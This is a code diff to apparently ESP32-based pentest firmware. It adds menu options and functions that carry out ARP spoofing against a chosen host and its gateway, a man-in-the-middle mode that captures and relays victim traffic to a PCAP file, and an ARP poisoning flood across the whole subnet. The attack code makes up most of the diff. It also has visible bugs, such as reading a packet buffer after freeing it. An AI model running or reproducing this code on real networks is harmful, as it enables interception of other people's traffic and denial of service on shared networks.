@@ -46,7 +46,7 @@ void local_scan_setup() {
         struct netif *net_iface = (struct netif *)netif;
         etharp_cleanup_netif(net_iface); // to avoid gateway duplication
 
-        displayRedStripe("Probing " + String(broadcast - networkAddress - 1) + " hosts",TFT_WHITE, bruceConfig.priColor); // minus broadcast and subnet mask
+        displayRedStripe("Probing " + String(broadcast - networkAddress - 1) + " hosts",getComplementaryColor2(bruceConfig.priColor), bruceConfig.priColor); // minus broadcast and subnet mask
 
         // send arp requests, read table each ARP_TABLE_SIZE requests
         uint16_t tableReadCounter = 0;
@@ -100,7 +100,10 @@ void afterScanOptions(const Host& host) {
   #ifndef LITE_VERSION
     {"SSH Connect", [=](){ ssh_setup(host.ip.toString()); }},
   #endif
+    {"ARP Poisoning", [=](){ arpPoisoner(); }},
+    {"ARP Spoofing", [=](){ arpSpoofing(host, false); }},
   };
+  if(sdcardMounted) options.push_back({"ARP MITM", [=](){ arpSpoofing(host, true); }});
   loopOptions(options);
   delay(200);
 }
@@ -141,4 +144,289 @@ void hostInfo(const Host& host) {
 
   while(checkSelPress()) yield();
   while(!checkSelPress()) yield();
+}
+
+
+
+
+// ARP Poisoning and MITM POC first step (ARPSpoofing, not saving and forwarding packets)
+#include <modules/wifi/sniffer.h> //use PCAP file saving functions
+#include <esp_wifi.h>
+#include <lwip/sockets.h>
+#include <lwip/dns.h>
+#include <lwip/inet.h>
+#include <lwip/igmp.h>
+#include <lwip/netif.h>
+#include <lwip/err.h>
+#include <lwip/sys.h>
+#include <lwip/timeouts.h>
+#include <lwip/init.h>
+#include <lwip/mem.h>
+#include <lwip/memp.h>
+#include <lwip/ip_addr.h>
+#include <lwip/etharp.h>
+#include <iostream>
+#include <sstream>
+#include <iomanip>
+
+
+// Função para converter IP para string
+String ipToString(const uint8_t* ip) {
+  return String(ip[0]) + "." + String(ip[1]) + "." + String(ip[2]) + "." + String(ip[3]);
+}
+
+// Função para converter MAC para string
+String macToString(const uint8_t* mac) {
+  char buf[18];
+  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return String(buf);
+}
+
+void stringToMAC(const std::string& macStr, uint8_t MAC[6]) {
+    std::stringstream ss(macStr);
+    unsigned int temp;
+    for (int i = 0; i < 6; ++i) {
+        char delimiter;
+        ss >> std::hex >> temp;
+        MAC[i] = static_cast<uint8_t>(temp); 
+        ss >> delimiter; 
+    }
+}
+
+// Função para obter o MAC do gateway
+void getGatewayMAC(uint8_t gatewayMAC[6]) {
+  wifi_ap_record_t ap_info;
+  if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
+    memcpy(gatewayMAC, ap_info.bssid, 6);
+    Serial.print("Gateway MAC: ");
+    Serial.println(macToString(gatewayMAC));
+  } else {
+    Serial.println("Erro ao obter informações do AP.");
+  }
+}
+
+// Function provided by @Fl1p, thank you brother!
+// Função para enviar pacotes ARP falsificados
+void sendARPPacket(uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC, File pcapFile) {
+  struct eth_hdr *ethhdr;
+  struct etharp_hdr *arphdr;
+  struct pbuf *p;
+  struct netif *netif;
+
+
+  // Obter interface de rede
+  netif = netif_list;
+  if (netif == NULL) {
+    Serial.println("Nenhuma interface de rede encontrada!");
+    return;
+  }
+
+  // Alocar pbuf para o pacote ARP
+  p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
+  if (p == NULL) {
+    Serial.println("Falha ao alocar pbuf!");
+    return;
+  }
+
+  ethhdr = (struct eth_hdr *)p->payload;
+  arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);
+
+  // Preencher cabeçalho Ethernet
+  MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN);  // MAC do alvo (vítima ou gateway)
+  MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN);       // MAC do atacante (nosso)
+  ethhdr->type = PP_HTONS(ETHTYPE_ARP);
+
+  // Preencher cabeçalho ARP
+  arphdr->hwtype = PP_HTONS(1); // 1 é o código para Ethernet no campo hardware type (hwtype)
+  arphdr->proto = PP_HTONS(ETHTYPE_IP);
+  arphdr->hwlen = ETH_HWADDR_LEN;
+  arphdr->protolen = sizeof(ip4_addr_t);
+  arphdr->opcode = PP_HTONS(ARP_REPLY);
+
+  MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);  // MAC falsificado (gateway ou vítima)
+  MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // IP falsificado (gateway ou vítima)
+  MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);    // MAC real do alvo (vítima ou gateway)
+  MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t)); // IP real do alvo (vítima ou gateway)
+
+  // Enviar o pacote
+  netif->linkoutput(netif, p);
+  pbuf_free(p);
+  Serial.println("Pacote ARP enviado!");
+  tft.println("Pacote ARP enviado!");
+
+  // Capturar o pacote no arquivo PCAP
+  if (pcapFile) {
+    pcapFile.write((const uint8_t *)p->payload, p->tot_len); // don't know if it will work
+    pcapFile.flush();
+  }
+
+}
+
+
+// Converts from IP String to byte array
+bool parseIPString(const String &ipStr, uint8_t *ipArray) {
+  int parts[4] = {0};
+  int count = sscanf(ipStr.c_str(), "%d.%d.%d.%d", &parts[0], &parts[1], &parts[2], &parts[3]);
+  if (count == 4) {
+    for (int i = 0; i < 4; i++) {
+      ipArray[i] = (uint8_t)parts[i];
+    }
+    return true;
+  }
+  return false;
+}
+
+// gateway and clients MAC for callback
+uint8_t gatewayMAC[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}; 
+uint8_t clientMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}; 
+uint8_t myMAC[6];  // MAC do ESP32
+File pcapFile;
+
+// Callback para processar pacotes no modo Promiscuous
+void mitmCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
+      return; // Processa apenas pacotes de gerenciamento e dados
+  }
+
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*) buf;
+  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
+  uint8_t* payload = pkt->payload;
+  // preamble (8 bytes) + destMAC(6 bytes) + srcMAC(6 bytes)
+  uint8_t* destMAC = payload + 8;
+  uint8_t* srcMAC = payload + 14;
+
+  // Verifica se o pacote é destinado ao ESP32
+  if (memcmp(destMAC, myMAC, 6) == 0) {
+    uint32_t timestamp = now(); // current timestamp
+    uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)
+
+    uint32_t len = ctrl.sig_len;
+    if(type == WIFI_PKT_MGMT) {
+      len -= 4; // Need to remove last 4 bytes (for checksum) or packet gets malformed # https://github.com/espressif/esp-idf/issues/886
+    }
+    newPacketSD(timestamp, microseconds, len, pkt->payload, pcapFile); // If it is to save everything, saves every packet
+
+    // Encaminha para o cliente se veio do gateway
+    if (memcmp(srcMAC, gatewayMAC, 6) == 0) {
+      memcpy(destMAC, clientMAC, 6); // Ajusta MAC de destino
+      //What happens with checkSUM???
+      esp_wifi_80211_tx(WIFI_IF_AP, payload, pkt->rx_ctrl.sig_len, false);
+    }
+    // Encaminha para o gateway se veio do cliente
+    else if (memcmp(srcMAC, clientMAC, 6) == 0) {
+      memcpy(destMAC, gatewayMAC, 6); // Ajusta MAC de destino
+      //What happens with checkSUM???
+      esp_wifi_80211_tx(WIFI_IF_STA, payload, pkt->rx_ctrl.sig_len, false);
+    }
+  }
+}
+
+void arpSpoofing(const Host& host, bool mitm) {
+
+  uint8_t gatewayIP[4];
+  uint8_t victimIP[4]; // Endereço IP da vítima
+  uint8_t gatewayMAC[6];  // MAC do Gateway
+  uint8_t victimMAC[6];  // MAC da vítima
+  
+
+  static int nf=0;
+  FS *fs;
+  if(setupSdCard()) fs=&SD;
+  else { 
+    fs=&LittleFS;
+    mitm=false;   //LittleFs doesn have room and processing to run this attack;
+  }
+  if(!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
+  while(fs->exists(String("/BrucePCAP/ARP_session_" + String(nf++) + ".pcap").c_str())) yield();
+  pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str());
+  
+  writeHeader(pcapFile); // write pcap header into the file
+
+  // Get the MAC from the attacker (bruce MAC)
+  esp_read_mac(myMAC, ESP_MAC_WIFI_STA);
+  for(int i=0; i<4; i++) victimIP[i] = host.ip[i];
+  stringToMAC(host.mac.c_str(),victimMAC);
+  getGatewayMAC(gatewayMAC);
+  IPAddress gatewayIp = WiFi.gatewayIP();
+  for(int i=0; i<4; i++) gatewayIP[i] = gatewayIp[i];
+
+  drawMainBorderWithTitle("ARP Spoofing");
+  padprintln("");
+
+  if(mitm) {
+    tft.setTextSize(FP);
+    padprintln("Man in The middle Activated");
+    padprintln("/BrucePCAP/ARP_session_" + String(nf) + ".pcap");
+    // Setup promiscuous mode
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(mitmCallback);
+
+    Serial.println("Promiscuous Mode ACTIVATED, reading data to/BrucePCAP/ARP_session_" + String(nf) + ".pcap");
+  }
+  padprintln("Tgt:" + host.mac);
+  padprintln("GTW:" + macToString(gatewayMAC));
+  padprintln("");
+  padprintln("Press Any key to STOP.");
+
+
+  long tmp=0;
+  while(!checkAnyKeyPress()) {
+    if(tmp+2000<millis()){  // sends frames every 5 seconds
+      // Enviar resposta ARP falsificada para a vítima (associando o IP do gateway ao MAC do atacante)
+      sendARPPacket(victimIP, victimMAC, gatewayIP, myMAC, pcapFile);
+                
+      // Enviar resposta ARP falsificada para o gateway (associando o IP da vítima ao MAC do atacante)
+      sendARPPacket(gatewayIP, gatewayMAC, victimIP, myMAC, pcapFile);
+      tmp=millis();
+    }
+  }
+  
+  if(mitm) {
+    // Configura o modo Promiscuous
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+
+    Serial.println("Promiscuous mode deactivated.");
+  }
+
+}
+
+void arpPoisoner() {
+  
+  uint8_t gatewayIP[4];
+  uint8_t victimIP[4]; // Endereço IP da vítima
+  uint8_t gatewayMAC[6];  // MAC do Gateway
+  uint8_t victimMAC[6];  // MAC da vítima
+
+  for (int i = 0; i < 6; i++){
+    gatewayMAC[i] = random(256);
+    victimMAC[i] = random(256);
+  }
+  IPAddress ip = WiFi.gatewayIP();
+  for(int i=0; i<4;i++) {
+    gatewayIP[i]=ip[i];
+    victimIP[i]=ip[i];
+  }
+  long tmp=0;
+    drawMainBorderWithTitle("ARP Poisoning");
+  padprintln("");
+
+  padprintln("Press Any key to STOP.");
+
+
+  while(!checkAnyKeyPress()) {
+    if(tmp+2000<millis()){  // sends frames every 5 seconds
+      for(int i=1;i<255;i++) {
+        victimIP[3]=i;
+        // Sends random Gateway MAC to all devices in the network
+        sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
+           
+        // Sends Device random MACs back to gateway
+        sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);
+
+        delay(1); 
+      }
+      tmp=millis();
+    }
+  }
 }
